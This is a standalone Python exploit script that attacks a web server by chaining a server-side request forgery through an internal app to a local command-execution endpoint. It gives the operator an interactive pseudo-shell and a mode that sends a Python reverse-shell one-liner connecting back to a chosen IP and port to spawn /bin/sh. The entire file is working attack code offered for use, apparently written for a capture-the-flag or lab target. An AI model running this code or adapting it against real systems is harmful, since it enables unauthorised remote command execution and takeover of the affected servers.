import requests
from urllib.parse import quote
import sys
from bs4 import BeautifulSoup

def pseudoshell(target_ip):
    while True:
        try:
            cmd = input("# ")
            if cmd.lower() in ['exit', 'quit']:
                break
            
            ecmd = quote(quote(quote(cmd)))
            url = f"http://{target_ip}/load?q=http://internal.app.local/load?q=http::////127.0.0.1:5000/runme?x={ecmd}"
            response = requests.get(url)

            soup = BeautifulSoup(response.text, 'html.parser')
            a_tag = soup.find('a')
            if a_tag:
                print(a_tag.get_text(strip=True))
            else:
                print("No <a> tag found in the response")

        except Exception as e:
            print(f"An error occurred: {e}")

def reverse_shell(target_ip, local_ip, local_port):
    cmd = (
        "python3 -c 'import socket,subprocess,os;"
        "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
        f"s.connect((\"{local_ip}\",{local_port}));"
        "os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);"
        "import pty; pty.spawn(\"/bin/sh\")'"
    )
    ecmd = quote(quote(quote(cmd)))
    url = f"http://{target_ip}/load?q=http://internal.app.local/load?q=http::////127.0.0.1:5000/runme?x={ecmd}"
    response = requests.get(url)
    print("Reverse shell command sent. Check your listener.")

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python script.py <TARGET IP>")
        sys.exit(1)

    target_ip = sys.argv[1]

    print("Select an option:")
    print("1. Pseudo-shell")
    print("2. Reverse shell")
    
    choice = input("Enter your choice (1 or 2): ")

    if choice == '1':
        pseudoshell(target_ip)
    elif choice == '2':
        local_ip = input("Enter your local IP address: ")
        local_port = input("Enter your local port: ")
        reverse_shell(target_ip, local_ip, local_port)
    else:
        print("Invalid choice")

